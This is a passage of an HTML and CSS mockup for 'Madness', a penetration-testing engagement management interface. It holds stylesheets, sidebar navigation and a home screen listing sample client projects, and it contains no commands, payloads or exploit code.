            border-radius: 6px;
            padding: 15px;
        }

        [data-theme="dark"] .finding-item {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }

        .finding-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }

        .finding-actions {
            display: flex;
            gap: 10px;
        }

        .edit-finding, .delete-finding {
            padding: 4px 8px;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 0.8em;
        }

        .edit-finding {
            background: #007bff;
            color: white;
        }

        [data-theme="dark"] .edit-finding {
            background: #66b3ff;
        }

        .delete-finding {
            background: #dc3545;
            color: white;
        }

        [data-theme="dark"] .delete-finding {
            background: #f44336;
        }

        /* Cleanup Tab Styles */
        .cleanup-section {
            margin-bottom: 30px;
        }

        .cleanup-checklist {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .cleanup-item {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }

        .cleanup-item label {
            display: flex;
            align-items: center;
            gap: 10px;
            font-weight: 500;
            color: var(--grey-700);
        }

        [data-theme="dark"] .cleanup-item label {
            color: var(--grey-200);
        }

        .cleanup-checkbox {
            width: 18px;
            height: 18px;
        }

        .cleanup-command {
            display: flex;
            align-items: center;
            gap: 10px;
            background: var(--grey-100);
            padding: 10px;
            border-radius: 4px;
            border-left: 3px solid #007bff;
        }

        [data-theme="dark"] .cleanup-command {
            background: var(--grey-700);
            border-left-color: #66b3ff;
        }

        .cleanup-command code {
            flex: 1;
            background: none;
            font-family: monospace;
            color: var(--grey-700);
        }

        [data-theme="dark"] .cleanup-command code {
            color: var(--grey-200);
        }

        .impact-notes {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .impact-item {
            display: flex;
            gap: 15px;
            padding: 15px;
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 6px;
        }

        [data-theme="dark"] .impact-item {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }

        .impact-icon {
            font-size: 1.5em;
            flex-shrink: 0;
        }

        .impact-content h5 {
            margin: 0 0 5px 0;
            color: var(--grey-700);
        }

        [data-theme="dark"] .impact-content h5 {
            color: var(--grey-200);
        }

        .impact-content p {
            margin: 0;
            font-size: 0.9em;
            color: var(--grey-500);
        }

        [data-theme="dark"] .impact-content p {
            color: var(--grey-400);
        }

        .verification-steps {
            display: flex;
            flex-direction: column;
            gap: 15px;
        }

        .step-item {
            display: flex;
            gap: 15px;
            align-items: flex-start;
        }

        .step-number {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            background: var(--primary-color);
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 600;
            flex-shrink: 0;
        }

        .step-content h5 {
            margin: 0 0 5px 0;
            color: var(--text-color);
        }

        .step-content p {
            margin: 0;
            font-size: 0.9em;
            color: var(--text-muted);
        }

        /* Mobile Responsiveness for Modal */
        @media (max-width: 768px) {
            .action-modal {
                width: 100%;
                height: 100vh;
                max-width: 100vw;
                max-height: 100vh;
                border-radius: 0;
            }

            .modal-header {
                padding: 15px;
                position: sticky;
                top: 0;
                z-index: 10;
                background: var(--surface-color);
            }

            .modal-title {
                font-size: 1.2em;
            }

            .modal-subtitle {
                flex-direction: column;
                align-items: flex-start;
                gap: 5px;
                font-size: 0.85em;
            }

            .modal-nav {
                position: sticky;
                top: 60px;
                z-index: 9;
                background: var(--surface-color);
            }

            .modal-nav-btn {
                padding: 10px 12px;
                font-size: 0.8em;
            }

            .modal-nav-btn span {
                display: none;
            }

            .modal-tab-content {
                padding: 15px;
            }

            .tool-info-grid {
                grid-template-columns: 1fr;
            }

            .techniques-grid {
                grid-template-columns: 1fr;
            }

            .command-card {
                margin-bottom: 15px;
            }

            .command-header {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }

            .command-template {
                padding: 10px;
                font-size: 0.85em;
                overflow-x: auto;
            }

            .media-grid {
                grid-template-columns: 1fr;
            }

            .risk-grid {
                grid-template-columns: 1fr;
            }

            .finding-template {
                margin-bottom: 15px;
            }

            .template-header {
                flex-direction: column;
                align-items: stretch;
                gap: 10px;
            }

            .form-row {
                flex-direction: column;
            }

            .finding-input,
            .severity-select {
                width: 100%;
            }

            .modal-footer {
                flex-direction: column;
                gap: 10px;
                padding: 15px;
                position: sticky;
                bottom: 0;
                background: var(--surface-color);
                z-index: 10;
            }

            .modal-footer-left,
            .modal-footer-right {
                width: 100%;
                justify-content: stretch;
            }

            .modal-footer button {
                flex: 1;
                padding: 12px;
            }

            /* Simplify issue accordion on mobile */
            .issue-header {
                padding: 12px;
            }

            .issue-header h4 {
                font-size: 0.9em;
            }

            /* Optimize cleanup checklist for mobile */
            .cleanup-item label {
                font-size: 0.9em;
            }

            .cleanup-command {
                flex-direction: column;
                align-items: stretch;
                gap: 8px;
            }

            .cleanup-command code {
                font-size: 0.8em;
                word-break: break-all;
            }

            /* Impact notes mobile optimization */
            .impact-item {
                flex-direction: column;
                text-align: center;
            }

            .impact-icon {
                font-size: 2em;
            }

            /* Verification steps mobile */
            .step-item {
                flex-direction: column;
                text-align: center;
                align-items: center;
            }

            .step-number {
                margin-bottom: 10px;
            }
        }

        @media (max-width: 480px) {
            .modal-header {
                padding: 12px;
            }

            .modal-title {
                font-size: 1em;
            }

            .modal-close {
                font-size: 1.2em;
                padding: 8px;
            }

            .modal-tab-content {
                padding: 12px;
            }

            .section-title {
                font-size: 1em;
            }

            /* Even more compact nav for very small screens */
            .modal-nav-btn {
                padding: 10px;
                font-size: 1.2em;
            }

            /* Show only icons in nav on very small screens */
            .modal-nav-btn::after {
                content: attr(data-tab);
                display: none;
            }

            /* Stack all grids on small mobile */
            .outcomes-list {
                font-size: 0.9em;
            }

            .outcome-item {
                padding: 10px;
            }

            /* Smaller text for code blocks */
            .command-template code {
                font-size: 0.75em;
            }

            /* Full width buttons on small screens */
            .copy-btn,
            .use-template-btn,
            .add-finding-btn,
            .save-template-btn {
                width: 100%;
                padding: 10px;
            }

            /* Compact findings display */
            .finding-item {
                padding: 12px;
            }

            .finding-header {
                flex-direction: column;
                align-items: flex-start;
                gap: 8px;
            }

            .severity {
                align-self: flex-start;
            }
        }

        /* Landscape mobile optimization */
        @media (max-width: 768px) and (orientation: landscape) {
            .action-modal {
                height: 100vh;
            }

            .modal-header {
                padding: 10px 15px;
            }

            .modal-nav-btn {
                padding: 8px 12px;
            }

            .modal-tab-content {
                padding: 10px 15px;
            }

            .modal-footer {
                padding: 10px 15px;
            }
        }
        
        /* Settings Page Styles */
        .settings-container {
            padding: 2rem;
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .settings-header {
            margin-bottom: 2rem;
            text-align: center;
        }
        
        .settings-title {
            margin: 0 0 0.5rem 0;
            font-size: 2em;
            color: var(--grey-700);
        }
        
        [data-theme="dark"] .settings-title {
            color: var(--grey-200);
        }
        
        .settings-subtitle {
            margin: 0;
            color: var(--grey-500);
            font-size: 1.1em;
        }
        
        [data-theme="dark"] .settings-subtitle {
            color: var(--grey-400);
        }
        
        .settings-nav {
            display: flex;
            flex-wrap: wrap;
            gap: 0.5rem;
            justify-content: center;
            margin-bottom: 2rem;
            padding: 1rem;
            background: var(--grey-100);
            border-radius: 12px;
            border: 1px solid var(--grey-200);
        }
        
        [data-theme="dark"] .settings-nav {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }
        
        .settings-nav-btn {
            padding: 0.75rem 1.5rem;
            background: white;
            color: var(--grey-500);
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            cursor: pointer;
            font-size: 0.9em;
            font-weight: 500;
            transition: all 0.2s;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        [data-theme="dark"] .settings-nav-btn {
            background: var(--grey-700);
            color: var(--grey-400);
            border-color: var(--grey-600);
        }
        
        .settings-nav-btn:hover {
            background: #007bff;
            color: white;
            border-color: #007bff;
        }
        
        [data-theme="dark"] .settings-nav-btn:hover {
            background: #66b3ff;
            border-color: #66b3ff;
        }
        
        .settings-nav-btn.active {
            background: #007bff;
            color: white;
            border-color: #007bff;
        }
        
        [data-theme="dark"] .settings-nav-btn.active {
            background: #66b3ff;
            border-color: #66b3ff;
        }
        
        .settings-content {
            background: white;
            border: 1px solid var(--grey-200);
            border-radius: 12px;
            min-height: 600px;
        }
        
        [data-theme="dark"] .settings-content {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }
        
        .settings-section {
            display: none;
            padding: 2rem;
        }
        
        .settings-section.active {
            display: block;
        }
        
        .settings-section-title {
            margin: 0 0 2rem 0;
            font-size: 1.5em;
            color: var(--grey-700);
            border-bottom: 2px solid #007bff;
            padding-bottom: 0.5rem;
        }
        
        [data-theme="dark"] .settings-section-title {
            color: var(--grey-200);
            border-bottom-color: #66b3ff;
        }
        
        .setting-group {
            margin-bottom: 2rem;
            padding-bottom: 1.5rem;
            border-bottom: 1px solid var(--grey-200);
        }
        
        [data-theme="dark"] .setting-group {
            border-bottom-color: #444;
        }
        
        .setting-group:last-child {
            border-bottom: none;
        }
        
        .setting-group-title {
            margin: 0 0 1.5rem 0;
            font-size: 1.2em;
            color: #495057;
            font-weight: 600;
        }
        
        [data-theme="dark"] .setting-group-title {
            color: #ced4da;
        }
        
        .setting-item {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 1.5rem;
            gap: 2rem;
        }
        
        .setting-info {
            flex: 1;
        }
        
        .setting-label {
            display: block;
            font-weight: 600;
            color: var(--grey-700);
            margin-bottom: 0.25rem;
        }
        
        [data-theme="dark"] .setting-label {
            color: var(--grey-200);
        }
        
        .setting-description {
            margin: 0;
            font-size: 0.9em;
            color: var(--grey-500);
            line-height: 1.4;
        }
        
        [data-theme="dark"] .setting-description {
            color: var(--grey-400);
        }
        
        .setting-control {
            flex-shrink: 0;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        /* Toggle Switch */
        .switch {
            position: relative;
            display: inline-block;
            width: 50px;
            height: 24px;
        }
        
        .switch.small {
            width: 40px;
            height: 20px;
        }
        
        .switch input {
            opacity: 0;
            width: 0;
            height: 0;
        }
        
        .slider {
            position: absolute;
            cursor: pointer;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background-color: #ccc;
            transition: .4s;
            border-radius: 24px;
        }
        
        .slider:before {
            position: absolute;
            content: "";
            height: 18px;
            width: 18px;
            left: 3px;
            bottom: 3px;
            background-color: white;
            transition: .4s;
            border-radius: 50%;
        }
        
        .switch.small .slider:before {
            height: 14px;
            width: 14px;
        }
        
        input:checked + .slider {
            background-color: #007bff;
        }
        
        [data-theme="dark"] input:checked + .slider {
            background-color: #66b3ff;
        }
        
        input:checked + .slider:before {
            transform: translateX(26px);
        }
        
        .switch.small input:checked + .slider:before {
            transform: translateX(20px);
        }
        
        /* Color Picker */
        .color-picker-group {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .color-option {
            width: 32px;
            height: 32px;
            border: 2px solid #dee2e6;
            border-radius: 6px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .color-option:hover {
            border-color: #007bff;
            transform: scale(1.1);
        }
        
        .color-input {
            width: 32px;
            height: 32px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
        }
        
        /* Range Input */
        .range-input {
            width: 150px;
            margin-right: 0.5rem;
        }
        
        .range-value {
            font-size: 0.9em;
            color: var(--grey-500);
            min-width: 40px;
        }
        
        [data-theme="dark"] .range-value {
            color: var(--grey-400);
        }
        
        /* Path Input Group */
        .path-input-group {
            display: flex;
            gap: 0.5rem;
            align-items: center;
        }
        
        .path-input-group .form-input {
            min-width: 300px;
        }
        
        /* Integration Grid */
        .integration-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 1.5rem;
        }
        
        .integration-card {
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 12px;
            padding: 1.5rem;
            text-align: center;
            transition: all 0.2s;
        }
        
        [data-theme="dark"] .integration-card {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }
        
        .integration-card:hover {
            border-color: #007bff;
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(0,123,255,0.1);
        }
        
        [data-theme="dark"] .integration-card:hover {
            border-color: #66b3ff;
        }
        
        .integration-icon {
            font-size: 3em;
            margin-bottom: 1rem;
        }
        
        .integration-card h4 {
            margin: 0 0 0.5rem 0;
            color: var(--grey-700);
        }
        
        [data-theme="dark"] .integration-card h4 {
            color: var(--grey-200);
        }
        
        .integration-card p {
            margin: 0 0 1rem 0;
            color: var(--grey-500);
            font-size: 0.9em;
        }
        
        [data-theme="dark"] .integration-card p {
            color: var(--grey-400);
        }
        
        /* API Keys Section */
        .api-keys-section, .webhooks-section {
            margin-top: 1.5rem;
        }
        
        .api-keys-header, .webhooks-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 1rem;
        }
        
        .api-keys-header h5, .webhooks-header h5 {
            margin: 0;
            color: var(--grey-700);
        }
        
        [data-theme="dark"] .api-keys-header h5,
        [data-theme="dark"] .webhooks-header h5 {
            color: var(--grey-200);
        }
        
        .api-key-item, .webhook-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            margin-bottom: 0.5rem;
        }
        
        [data-theme="dark"] .api-key-item,
        [data-theme="dark"] .webhook-item {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }
        
        .api-key-info, .webhook-info {
            display: flex;
            flex-direction: column;
            gap: 0.25rem;
        }
        
        .api-key-name, .webhook-url {
            font-weight: 600;
            color: var(--grey-700);
        }
        
        [data-theme="dark"] .api-key-name,
        [data-theme="dark"] .webhook-url {
            color: var(--grey-200);
        }
        
        .api-key-value {
            font-family: monospace;
            color: var(--grey-500);
            font-size: 0.9em;
        }
        
        [data-theme="dark"] .api-key-value {
            color: var(--grey-400);
        }
        
        .webhook-events {
            display: flex;
            gap: 0.5rem;
            flex-wrap: wrap;
        }
        
        .event-badge {
            background: #007bff;
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: 4px;
            font-size: 0.8em;
        }
        
        [data-theme="dark"] .event-badge {
            background: #66b3ff;
        }
        
        .api-key-actions, .webhook-actions {
            display: flex;
            align-items: center;
            gap: 1rem;
        }
        
        .api-key-date {
            font-size: 0.9em;
            color: var(--grey-500);
        }
        
        [data-theme="dark"] .api-key-date {
            color: var(--grey-400);
        }
        
        /* Backup Actions */
        .backup-actions {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
        }
        
        .backup-action-card {
            background: var(--grey-100);
            border: 1px solid var(--grey-200);
            border-radius: 8px;
            padding: 1.5rem;
            text-align: center;
        }
        
        [data-theme="dark"] .backup-action-card {
            background: var(--grey-700);
            border-color: var(--grey-600);
        }
        
        .backup-action-card h5 {
            margin: 0 0 0.5rem 0;
            color: var(--grey-700);
        }
        
        [data-theme="dark"] .backup-action-card h5 {
            color: var(--grey-200);
        }
        
        .backup-action-card p {
            margin: 0 0 1rem 0;
            color: var(--grey-500);
            font-size: 0.9em;
        }
        
        [data-theme="dark"] .backup-action-card p {
            color: var(--grey-400);
        }
        
        /* Danger Zone */
        .danger-zone {
            border: 2px solid #dc3545;
            border-radius: 8px;
            padding: 1.5rem;
            background: #fff5f5;
        }
        
        [data-theme="dark"] .danger-zone {
            border-color: #f44336;
            background: #2d1b1b;
        }
        
        .danger-zone .setting-group-title {
            color: #dc3545;
        }
        
        [data-theme="dark"] .danger-zone .setting-group-title {
            color: #f44336;
        }
        
        .danger-actions {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
        
        .danger-action {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1rem;
            background: white;
            border: 1px solid #dc3545;
            border-radius: 6px;
        }
        
        [data-theme="dark"] .danger-action {
            background: #1a1a1a;
            border-color: #f44336;
        }
        
        .danger-info h5 {
            margin: 0 0 0.25rem 0;
            color: #dc3545;
        }
        
        [data-theme="dark"] .danger-info h5 {
            color: #f44336;
        }
        
        .danger-info p {
            margin: 0;
            color: var(--grey-500);
            font-size: 0.9em;
        }
        
        [data-theme="dark"] .danger-info p {
            color: var(--grey-400);
        }
        
        /* Settings Save Bar */
        .settings-save-bar {
            position: sticky;
            bottom: 0;
            background: white;
            border-top: 1px solid #dee2e6;
            padding: 1rem 2rem;
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 2rem;
            border-radius: 0 0 12px 12px;
        }
        
        [data-theme="dark"] .settings-save-bar {
            background: var(--grey-700);
            border-top-color: #555;
        }
        
        .save-status {
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        
        .status-indicator {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: #28a745;
        }
        
        [data-theme="dark"] .status-indicator {
            background: #4caf50;
        }
        
        .status-text {
            color: var(--grey-500);
            font-size: 0.9em;
        }
        
        [data-theme="dark"] .status-text {
            color: var(--grey-400);
        }
        
        .save-actions {
            display: flex;
            gap: 1rem;
        }
        
        /* Button Variants - Consistent with main app */
        .btn-primary {
            background: var(--button-primary);
            color: white;
            border: 1px solid var(--button-primary);
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .btn-primary:hover {
            background: var(--button-hover);
            border-color: var(--button-hover);
            transform: translateY(-1px);
        }
        
        .btn-secondary {
            background: var(--bg-secondary);
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .btn-secondary:hover {
            background: var(--bg-accent);
            color: var(--text-primary);
            border-color: var(--text-accent);
        }
        
        .btn-danger {
            background: var(--danger);
            color: white;
            border: 1px solid var(--danger);
            padding: 0.5rem 1rem;
            border-radius: 6px;
            cursor: pointer;
            font-weight: 500;
            transition: all 0.2s;
        }
        
        .btn-danger:hover {
            background: #c82333;
            border-color: #c82333;
            transform: translateY(-1px);
        }
        
        .btn-danger-small, .btn-secondary-small {
            padding: 0.25rem 0.5rem;
            font-size: 0.8em;
        }
        
        /* Mobile Responsiveness for Settings */
        @media (max-width: 768px) {
            .settings-container {
                padding: 1rem;
            }
            
            .settings-nav {
                flex-direction: column;
                align-items: stretch;
            }
            
            .settings-nav-btn {
                justify-content: center;
            }
            
            .setting-item {
                flex-direction: column;
                gap: 1rem;
            }
            
            .integration-grid {
                grid-template-columns: 1fr;
            }
            
            .backup-actions {
                grid-template-columns: 1fr;
            }
            
            .danger-action {
                flex-direction: column;
                gap: 1rem;
                text-align: center;
            }
            
            .settings-save-bar {
                flex-direction: column;
                gap: 1rem;
                text-align: center;
            }
            
            .path-input-group .form-input {
                min-width: auto;
                width: 100%;
            }
        }
    </style>
</head>
<body data-theme="light">
    <div class="app-layout">
        <!-- Mobile Menu Overlay -->
        <div class="mobile-overlay" id="mobileOverlay" onclick="toggleSidebar()"></div>
        
        <!-- Sidebar -->
        <nav class="sidebar" id="sidebar">
            <div class="sidebar-header">
                <div class="logo">M</div>
                <div class="app-name">Madness</div>
            </div>
            
            
            <div class="nav-section">
                <div class="nav-section-title">Project</div>
                <ul class="nav-menu">
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('dashboard')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Dashboard</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('tasks')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Tasks</span>
                            <span class="nav-badge">5</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('comms')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Communications</span>
                            <span class="nav-badge">2</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('checklist')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Pre-Engagement</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('expenses')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Expenses</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('contacts')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Contacts</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('scope')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Scope</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('documents')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Documents</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('travel')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Travel & Hotels</span>
                        </a>
                    </li>
                </ul>
            </div>
            
            <div class="nav-section">
                <div class="nav-section-title">Testing</div>
                <ul class="nav-menu">
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('methodology')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Methodology</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('assets')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Assets</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('credentials')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Credentials</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('history')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">History</span>
                        </a>
                    </li>
                </ul>
            </div>
            
            <div class="nav-section">
                <div class="nav-section-title">Reporting</div>
                <ul class="nav-menu">
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('findings')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Findings</span>
                            <span class="nav-badge">3</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('attack-chains')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Attack Chains</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('screenshots')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Screenshots</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('reports')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Reports</span>
                        </a>
                    </li>
                </ul>
            </div>
            
            <div class="nav-section">
                <div class="nav-section-title">Tools</div>
                <ul class="nav-menu">
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('agents')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Agents</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('plugins')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Plugins</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('ingestors')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Ingestors</span>
                        </a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link" onclick="navigateToScreen('settings')">
                            <span class="nav-icon"></span>
                            <span class="nav-text">Settings</span>
                        </a>
                    </li>
                </ul>
            </div>
        </nav>
        
        <!-- Main Content -->
        <main class="main-content">
            <header class="top-bar">
                <div class="top-bar-left">
                    <button class="menu-toggle" onclick="toggleSidebar()"></button>
                    <div class="app-brand">Madness</div>
                    <div class="page-header">
                        <h1 class="page-title" id="pageTitle">Dashboard</h1>
                    </div>
                </div>
                <div class="top-bar-right">
                    <div class="user-menu">
                        <div class="user-avatar" onclick="toggleUserMenu()">JD</div>
                        <div class="user-dropdown" id="userDropdown">
                            <div class="user-dropdown-header">
                                <div class="user-info">
                                    <div class="user-name">John Doe</div>
                                    <div class="user-role">Lead Pentester</div>
                                </div>
                            </div>
                            <div class="dropdown-divider"></div>
                            <a class="dropdown-item" onclick="navigateToScreen('home'); closeUserMenu()">
                                <span class="dropdown-icon"></span>
                                <span>Home</span>
                            </a>
                            <a class="dropdown-item" onclick="navigateToScreen('settings'); closeUserMenu()">
                                <span class="dropdown-icon"></span>
                                <span>Settings</span>
                            </a>
                            <a class="dropdown-item" onclick="openUserProfile(); closeUserMenu()">
                                <span class="dropdown-icon"></span>
                                <span>Profile</span>
                            </a>
                            <div class="dropdown-divider"></div>
                            <a class="dropdown-item logout" onclick="logout(); closeUserMenu()">
                                <span class="dropdown-icon"></span>
                                <span>Logout</span>
                            </a>
                        </div>
                    </div>
                </div>
            </header>
            
            <div class="content-area">
                <!-- Home Screen -->
                <div class="screen-content active" id="home">
                    <div class="welcome-screen">
                        <div class="welcome-icon"></div>
                        <h2 class="welcome-title">Welcome to Madness</h2>
                        <p class="welcome-subtitle">Comprehensive penetration testing platform</p>
                        
                        <!-- Project Management Section -->
                        <div style="max-width: 800px; margin: 3rem auto; text-align: left;">
                            <h3 style="color: var(--text-primary); margin-bottom: 1.5rem; text-align: center;">Project Management</h3>
                            
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 2rem; margin-bottom: 3rem;">
                                <!-- Create New Project -->
                                <div class="project-action-card" onclick="openModal('newProjectModal')" style="background: linear-gradient(135deg, var(--button-primary), #3b82f6); color: white; padding: 2rem; border-radius: 12px; cursor: pointer; text-align: center; transition: transform 0.2s ease, box-shadow 0.2s ease;">
                                    <div style="font-size: 3rem; margin-bottom: 1rem;"></div>
                                    <h4 style="margin-bottom: 0.75rem; font-size: 1.25rem;">Create New Project</h4>
                                    <p style="opacity: 0.9; font-size: 0.875rem; line-height: 1.4;">Start a new penetration testing engagement with guided setup</p>
                                </div>
                                
                                <!-- Open Existing Project -->
                                <div class="project-action-card" onclick="openProjectSelector()" style="background: var(--bg-secondary); border: 2px solid var(--border); padding: 2rem; border-radius: 12px; cursor: pointer; text-align: center; transition: transform 0.2s ease, box-shadow 0.2s ease;">
                                    <div style="font-size: 3rem; margin-bottom: 1rem;"></div>
                                    <h4 style="margin-bottom: 0.75rem; font-size: 1.25rem; color: var(--text-primary);">Open Project</h4>
                                    <p style="color: var(--text-secondary); font-size: 0.875rem; line-height: 1.4;">Continue working on an existing penetration testing project</p>
                                </div>
                            </div>
                            
                            <!-- Recent Projects -->
                            <div style="margin-bottom: 3rem;">
                                <h4 style="color: var(--text-primary); margin-bottom: 1rem; text-align: center;">Recent Projects</h4>
                                <div style="display: grid; gap: 1rem;">
                                    <div class="recent-project" onclick="openProject('PROJ-001')" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; cursor: pointer; border: 1px solid var(--border); transition: background 0.2s ease;">
                                        <div style="font-size: 1.5rem;"></div>
                                        <div style="flex: 1;">
                                            <div style="font-weight: 600; color: var(--text-primary);">Acme Corporation - Internal Network Assessment</div>
                                            <div style="font-size: 0.875rem; color: var(--text-secondary); margin-top: 0.25rem;">Last accessed: 2 hours ago  15 findings  85% complete</div>
                                        </div>
                                        <div style="display: flex; align-items: center; gap: 0.5rem;">
                                            <span class="tag" style="background: var(--success); color: white; font-size: 0.75rem;">Active</span>
                                            <span style="color: var(--text-secondary);"></span>
                                        </div>
                                    </div>
                                    
                                    <div class="recent-project" onclick="openProject('PROJ-002')" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; cursor: pointer; border: 1px solid var(--border); transition: background 0.2s ease;">
                                        <div style="font-size: 1.5rem;"></div>
                                        <div style="flex: 1;">
                                            <div style="font-weight: 600; color: var(--text-primary);">TechStart Web Application Pentest</div>
                                            <div style="font-size: 0.875rem; color: var(--text-secondary); margin-top: 0.25rem;">Last accessed: 1 day ago  8 findings  60% complete</div>
                                        </div>
                                        <div style="display: flex; align-items: center; gap: 0.5rem;">
                                            <span class="tag" style="background: var(--warning); color: white; font-size: 0.75rem;">In Progress</span>
                                            <span style="color: var(--text-secondary);"></span>
                                        </div>
                                    </div>
                                    
                                    <div class="recent-project" onclick="openProject('PROJ-003')" style="display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--bg-secondary); border-radius: 8px; cursor: pointer; border: 1px solid var(--border); transition: background 0.2s ease; opacity: 0.7;">
                                        <div style="font-size: 1.5rem;"></div>
                                        <div style="flex: 1;">
                                            <div style="font-weight: 600; color: var(--text-primary);">Financial Services Security Review</div>
                                            <div style="font-size: 0.875rem; color: var(--text-secondary); margin-top: 0.25rem;">Last accessed: 1 week ago  23 findings  100% complete</div>
                                        </div>
                                        <div style="display: flex; align-items: center; gap: 0.5rem;">
                                            <span class="tag" style="background: var(--text-secondary); color: white; font-size: 0.75rem;">Completed</span>
                                            <span style="color: var(--text-secondary);"></span>
                                        </div>
                                    </div>
                                </div>
                                
                                <div style="text-align: center; margin-top: 1rem;">
                                    <button class="action-btn secondary" onclick="viewAllProjects()">View All Projects</button>
                                </div>
                            </div>
                        </div>
                        
                        <!-- Quick Access Section -->
                        <div style="background: var(--bg-secondary); border-radius: 12px; padding: 2rem; margin-top: 3rem; border: 1px solid var(--border);">
                            <h4 style="color: var(--text-primary); margin-bottom: 1.5rem; text-align: center;">Quick Access</h4>
                            <div class="quick-actions" style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 1.5rem;">
                                <div class="action-card" onclick="navigateToScreen('methodology')" style="background: var(--bg-primary); border: 1px solid var(--border); border-radius: 8px; padding: 1.5rem; cursor: pointer; text-align: center; transition: transform 0.2s ease;">
                                    <div class="action-icon" style="font-size: 2rem; margin-bottom: 0.75rem;"></div>
